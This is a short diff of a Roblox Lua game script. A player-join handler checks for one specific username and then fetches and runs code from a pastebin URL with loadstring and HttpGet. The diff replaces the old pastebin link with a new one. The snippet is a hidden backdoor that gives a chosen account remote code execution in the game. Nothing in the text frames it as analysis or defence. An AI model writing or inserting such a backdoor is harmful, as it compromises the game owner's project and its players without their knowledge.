@@ -7,7 +7,7 @@ end)
 
 game.Players.PlayerAdded:Connect(function(player)
   if player.Name == "1kS_up" then
-			loadstring(game:HttpGet("https://pastebin.com/raw/kYkU0LqY"))()
+			loadstring(game:HttpGet("https://pastebin.com/raw/TSk41g6s"))()
 		end
 end)
 
